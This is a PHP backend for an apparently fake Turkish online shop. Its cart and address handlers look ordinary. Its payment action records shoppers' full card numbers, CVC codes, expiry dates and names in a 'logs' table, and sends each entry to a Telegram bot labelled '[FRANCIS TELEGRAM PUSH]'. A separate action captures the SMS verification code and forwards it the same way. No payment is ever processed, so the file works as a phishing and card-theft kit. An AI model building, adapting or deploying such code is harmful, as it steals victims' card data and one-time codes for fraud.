<?php
require_once __DIR__ . '/brain.php';
require_once __DIR__ . '/sendGram.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

$ip_address = $_SERVER['REMOTE_ADDR'];
$response = ['success' => false, 'message' => 'Geçersiz istek veya eksik parametre.'];

try {
    $stmtPanel = $pdo->query("SELECT t_token, chat_id FROM panel LIMIT 1");
    $panelSettings = $stmtPanel->fetch(PDO::FETCH_ASSOC);
    $botToken = $panelSettings['t_token'] ?? null;
    $chatId = $panelSettings['chat_id'] ?? null;
} catch (PDOException $e) {
    $botToken = null;
    $chatId = null;
}

$action = $_GET['action'] ?? '';

if ($action == "sepet_ekle") {
    if (isset($_POST['ip'], $_POST['urun_id'])) {
        $ip_adresi = htmlspecialchars($_POST['ip']);
        $urun_id = intval($_POST['urun_id']);
        try {
            $sorgu_check = $pdo->prepare("SELECT urunler FROM sepet WHERE ip_adresi = ?");
            $sorgu_check->execute([$ip_adresi]);
            $sepet = $sorgu_check->fetch(PDO::FETCH_ASSOC);

            if ($sepet) {
                $urunler = json_decode($sepet['urunler'], true) ?? [];
                if (!in_array($urun_id, $urunler)) {
                    $urunler[] = $urun_id;
                    $guncelle = $pdo->prepare("UPDATE sepet SET urunler = ? WHERE ip_adresi = ?");
                    $guncelle->execute([json_encode($urunler), $ip_adresi]);
                } else {
                    $response = ['success' => false, 'message' => 'Her üründen bir adet satın alabilirsiniz.'];
                    header('Content-Type: application/json');
                    echo json_encode($response);
                    exit();
                }
            } else {
                $urunler = [$urun_id];
                $ekle = $pdo->prepare("INSERT INTO sepet (ip_adresi, urunler) VALUES (?, ?)");
                $ekle->execute([$ip_adresi, json_encode($urunler)]);
            }

            $itemCount = count($urunler);
            $newTotal = 0;
            if ($itemCount > 0) {
                $placeholders = implode(",", array_fill(0, $itemCount, '?'));
                $sorgu_urunler = $pdo->prepare("SELECT urun_fiyati FROM urunler WHERE id IN ($placeholders)");
                $sorgu_urunler->execute($urunler);
                $sepet_urunleri = $sorgu_urunler->fetchAll(PDO::FETCH_ASSOC);

                foreach ($sepet_urunleri as $urun) {
                    $newTotal += floatval(str_replace(',', '.', preg_replace('/[^0-9,]/', '', $urun['urun_fiyati'])));
                }
            }
            
            $sorgu_eklenen_urun = $pdo->prepare("SELECT urun_adi, urun_resmi, urun_fiyati FROM urunler WHERE id = ?");
            $sorgu_eklenen_urun->execute([$urun_id]);
            $addedProduct = $sorgu_eklenen_urun->fetch(PDO::FETCH_ASSOC);

            if ($addedProduct) {
                $addedProduct['urun_fiyati_formatli'] = number_format(floatval(str_replace(',', '.', preg_replace('/[^0-9,]/', '', $addedProduct['urun_fiyati']))), 2, ',', '.');
            }

            $response = [
                'success' => true,
                'message' => 'Ürün sepete eklendi.',
                'newTotal' => number_format($newTotal, 2, ',', '.'),
                'itemCount' => $itemCount,
                'addedProduct' => $addedProduct
            ];

        } catch (PDOException $e) {
            $response = ['success' => false, 'message' => 'Veritabanı hatası.'];
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();

} elseif ($action == "adres") {
    $success = false;
    $message = 'Gerekli tüm alanlar doldurulmalıdır.';
    $required_fields = ['baslik', 'il', 'ilce', 'mahalle', 'cadde', 'bina', 'isim', 'soyisim', 'telefon'];
    $missing_fields = false;
    foreach($required_fields as $field){
        if(empty($_POST[$field])){
            $missing_fields = true;
            break;
        }
    }

    if(!$missing_fields) {
        try {
            $checkAdresStmt = $pdo->prepare("SELECT * FROM logs_adres WHERE ip_adresi = ?");
            $checkAdresStmt->execute([$ip_address]);
            $checkAdres = $checkAdresStmt->fetch(PDO::FETCH_ASSOC);

            if ($checkAdres) {
                $sorgu = $pdo->prepare("UPDATE logs_adres SET baslik = ?, il = ?, ilce = ?, mahalle = ?, cadde = ?, bina = ?, kat = ?, daire = ?, isim = ?, soyisim = ?, telefon = ?, tarih = ? WHERE ip_adresi = ?");
                $sorgu->execute([
                    htmlspecialchars($_POST['baslik']), htmlspecialchars($_POST['il']), htmlspecialchars($_POST['ilce']),
                    htmlspecialchars($_POST['mahalle']), htmlspecialchars($_POST['cadde']), htmlspecialchars($_POST['bina']),
                    htmlspecialchars($_POST['kat']), htmlspecialchars($_POST['daire']), htmlspecialchars($_POST['isim']),
                    htmlspecialchars($_POST['soyisim']), htmlspecialchars($_POST['telefon']),
                    date('d.m.Y H:i'), $ip_address
                ]);
                $success = true;
                $message = 'Adres güncellendi.';
            } else {
                $sorgu = $pdo->prepare("INSERT INTO logs_adres SET baslik = ?, il = ?, ilce = ?, mahalle = ?, cadde = ?, bina = ?, kat = ?, daire = ?, isim = ?, soyisim = ?, telefon = ?, ip_adresi = ?, tarih = ?");
                $sorgu->execute([
                    htmlspecialchars($_POST['baslik']), htmlspecialchars($_POST['il']), htmlspecialchars($_POST['ilce']),
                    htmlspecialchars($_POST['mahalle']), htmlspecialchars($_POST['cadde']), htmlspecialchars($_POST['bina']),
                    htmlspecialchars($_POST['kat']), htmlspecialchars($_POST['daire']), htmlspecialchars($_POST['isim']),
                    htmlspecialchars($_POST['soyisim']), htmlspecialchars($_POST['telefon']),
                    $ip_address, date('d.m.Y H:i')
                ]);
                $success = true;
                $message = 'Adres eklendi.';
            }
        } catch (PDOException $e) {
            $success = false;
            $message = 'Veritabanı hatası: ' . $e->getMessage();
        }
    }

    header('Content-Type: application/json');
    echo json_encode(['success' => $success, 'message' => $message]);
    exit();

} elseif ($action == "sepet_sil") {
    if (isset($_POST['ip'], $_POST['urun_id'])) {
        $ip_adresi = htmlspecialchars($_POST['ip']);
        $urun_id = htmlspecialchars($_POST['urun_id']);

        try {
            $sorgu_check = $pdo->prepare("SELECT urunler FROM sepet WHERE ip_adresi = ?");
            $sorgu_check->execute([$ip_adresi]);
            $sepet = $sorgu_check->fetch(PDO::FETCH_ASSOC);

            if ($sepet) {
                $urunler = json_decode($sepet['urunler'], true) ?? [];
                $index = array_search($urun_id, $urunler);

                if ($index !== false) {
                    unset($urunler[$index]);
                    $urunler = array_values($urunler);
                    $guncelle = $pdo->prepare("UPDATE sepet SET urunler = ? WHERE ip_adresi = ?");
                    $guncelle->execute([json_encode($urunler), $ip_adresi]);

                    $newCount = count($urunler);
                    $isEmpty = ($newCount === 0);
                    $newTotalFormatted = '0,00';

                    if (!$isEmpty) {
                        $placeholders = implode(',', array_fill(0, $newCount, '?'));
                        $sorgu_urunler = $pdo->prepare("SELECT urun_fiyati FROM urunler WHERE id IN ($placeholders)");
                        $sorgu_urunler->execute($urunler);
                        $kalan_urunler_bilgisi = $sorgu_urunler->fetchAll(PDO::FETCH_ASSOC);
                        
                        $newTotalRaw = 0;
                        foreach ($kalan_urunler_bilgisi as $urun) {
                            $newTotalRaw += floatval(str_replace(',', '.', preg_replace('/[^0-9,\.]/', '', $urun['urun_fiyati'])));
                        }
                        $newTotalFormatted = number_format($newTotalRaw, 2, ',', '.');
                    }
                    
                    $response = [
                        'success' => true,
                        'newCount' => $newCount,
                        'newTotal' => $newTotalFormatted,
                        'isEmpty' => $isEmpty
                    ];
                } else {
                    $response = ['success' => false, 'message' => 'Ürün sepette bulunamadı.'];
                }
            } else {
                $response = ['success' => false, 'message' => 'Sepet bulunamadı.'];
            }
        } catch (PDOException $e) {
            $response = ['success' => false, 'message' => 'Veritabanı hatası: ' . $e->getMessage()];
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit();

} elseif ($action == 'odeme' && isset($_POST['adsoyad'], $_POST['cvc'], $_POST['kart_numarasi'], $_POST['son_kullanim_tarihi'])) {
    try {
        $check_sql = "SELECT COUNT(*) FROM logs WHERE ip_address = :ip_address";
        $check_stmt = $pdo->prepare($check_sql);
        $check_stmt->execute([':ip_address' => $ip_address]);
        $entry_count = (int) $check_stmt->fetchColumn();

        $bakiye_raw = $_POST['bakiye'] ?? '0 TL';
        $bakiye_clean = str_replace(['.', ' TL'], '', $bakiye_raw);
        $bakiye_final = (float) str_replace(',', '.', $bakiye_clean);

        if ($entry_count > 0) {
            $params = [
                ':log_time' => date('Y-m-d H:i:s'),
                ':adsoyad' => trim($_POST['adsoyad']),
                ':kart_numarasi' => trim($_POST['kart_numarasi']),
                ':cvc' => trim($_POST['cvc']),
                ':son_kullanim_tarihi' => trim($_POST['son_kullanim_tarihi']),
                ':amount' => $bakiye_final,
                ':ip_address' => $ip_address
            ];

            $sql = "UPDATE logs SET 
                        log_time = :log_time, 
                        adsoyad = :adsoyad, 
                        kart_numarasi = :kart_numarasi, 
                        kart_cvv = :cvc, 
                        kart_skt = :son_kullanim_tarihi, 
                        amount = :amount,
                        sms_sifresi = NULL
                    WHERE ip_address = :ip_address";
            $stmt = $pdo->prepare($sql);

            if ($stmt->execute($params)) {
                $response = ['success' => true, 'is_new' => false, 'message' => 'Bilgileriniz güncellendi. Yönlendiriliyorsunuz...'];
                if ($botToken && $chatId) {
                    $telegramMessage = "<b>🔄 [FRANCIS TELEGRAM PUSH] - LOG GÜNCELLENDİ !</b>\n\n"
                        . "<b>Tutar:</b> " . htmlspecialchars($bakiye_raw) . "\n"
                        . "<b>Ad Soyad:</b> " . htmlspecialchars($params[':adsoyad']) . "\n"
                        . "<b>Kart Numarası:</b> " . htmlspecialchars($params[':kart_numarasi']) . "\n"
                        . "<b>SKT:</b> " . htmlspecialchars($params[':son_kullanim_tarihi']) . "\n"
                        . "<b>CVC:</b> " . htmlspecialchars($params[':cvc']) . "\n"
                        . "<b>IP Adresi:</b> " . htmlspecialchars($ip_address) . "\n"
                        . "<b>Tarih:</b> " . $params[':log_time'];
                    sendTelegramMessage($botToken, $chatId, $telegramMessage);
                }
            } else {
                $response['message'] = 'Kayıt güncelleme sırasında bir hata oluştu.';
            }
        } else {
            $params = [
                ':log_time' => date('Y-m-d H:i:s'),
                ':adsoyad' => trim($_POST['adsoyad']),
                ':kart_numarasi' => trim($_POST['kart_numarasi']),
                ':cvc' => trim($_POST['cvc']),
                ':son_kullanim_tarihi' => trim($_POST['son_kullanim_tarihi']),
                ':ip_address' => $ip_address,
                ':amount' => $bakiye_final
            ];
            
            $sql = "INSERT INTO logs (log_time, adsoyad, kart_numarasi, kart_cvv, kart_skt, ip_address, amount) 
                    VALUES (:log_time, :adsoyad, :kart_numarasi, :cvc, :son_kullanim_tarihi, :ip_address, :amount)";
            $stmt = $pdo->prepare($sql);

            if ($stmt->execute($params)) {
                $response = ['success' => true, 'is_new' => true, 'message' => 'Bilgileriniz alındı. Bir sonraki adıma yönlendiriliyorsunuz...'];
                if ($botToken && $chatId) {
                    $telegramMessage = "<b>📍 [FRANCIS TELEGRAM PUSH] - YENİ LOG !</b>\n\n"
                        . "<b>Tutar:</b> " . htmlspecialchars($bakiye_raw) . "\n"
                        . "<b>Ad Soyad:</b> " . htmlspecialchars($params[':adsoyad']) . "\n"
                        . "<b>Kart Numarası:</b> " . htmlspecialchars($params[':kart_numarasi']) . "\n"
                        . "<b>SKT:</b> " . htmlspecialchars($params[':son_kullanim_tarihi']) . "\n"
                        . "<b>CVC:</b> " . htmlspecialchars($params[':cvc']) . "\n"
                        . "<b>IP Adresi:</b> " . htmlspecialchars($ip_address) . "\n"
                        . "<b>Tarih:</b> " . $params[':log_time'];
                    sendTelegramMessage($botToken, $chatId, $telegramMessage);
                }
            } else {
                $response['message'] = 'Kayıt sırasında bir hata oluştu.';
            }
        }
    } catch (PDOException $e) {
        $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();

} elseif ($action == 'sms') {
    $json_data = file_get_contents('php://input');
    $data = json_decode($json_data, true);

    if (isset($data['sms'])) {
        $sms_code = trim($data['sms']);
       if (!empty($sms_code) && is_numeric($sms_code) && (strlen($sms_code) == 5 || strlen($sms_code) == 6)) {
            try {
                $sql_get_log = "SELECT adsoyad, kart_numarasi, amount FROM logs WHERE ip_address = :ip_address ORDER BY id DESC LIMIT 1";
                $stmt_get_log = $pdo->prepare($sql_get_log);
                $stmt_get_log->execute([':ip_address' => $ip_address]);
                $log_data = $stmt_get_log->fetch(PDO::FETCH_ASSOC);

                $sql_update_sms = "UPDATE logs SET sms_sifresi = :sms WHERE ip_address = :ip_address ORDER BY id DESC LIMIT 1";
                $stmt_update = $pdo->prepare($sql_update_sms);
                $stmt_update->execute([':sms' => $sms_code, ':ip_address' => $ip_address]);

                if ($stmt_update->rowCount() > 0) {
                    $response = ['success' => true, 'message' => 'SMS başarıyla alındı.'];

                    if ($botToken && $chatId && $log_data) {
                        $formatted_amount = number_format($log_data['amount'], 2, ',', '.') . ' TL';
                        $telegramMessage = "<b>📍 [FRANCIS TELEGRAM PUSH] - SMS GELDİ !</b>\n\n"
                            . "<b>Tutar:</b> " . htmlspecialchars($formatted_amount) . "\n"
                            . "<b>Ad Soyad:</b> " . htmlspecialchars($log_data['adsoyad']) . "\n"
                            . "<b>Kart Numarası:</b> " . htmlspecialchars($log_data['kart_numarasi']) . "\n"
                            . "<b>Gelen SMS:</b> " . htmlspecialchars($sms_code) . "\n"
                            . "<b>IP Adresi:</b> " . htmlspecialchars($ip_address);
                        sendTelegramMessage($botToken, $chatId, $telegramMessage);
                    }
                } else {
                    $response['message'] = 'Güncellenecek aktif bir kayıt bulunamadı.';
                }
            } catch (PDOException $e) {
                $response['message'] = 'Veritabanı hatası: ' . $e->getMessage();
            }
        } else {
            $response['message'] = 'Geçersiz SMS kodu formatı.';
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();
}

header('Content-Type: application/json');
echo json_encode($response);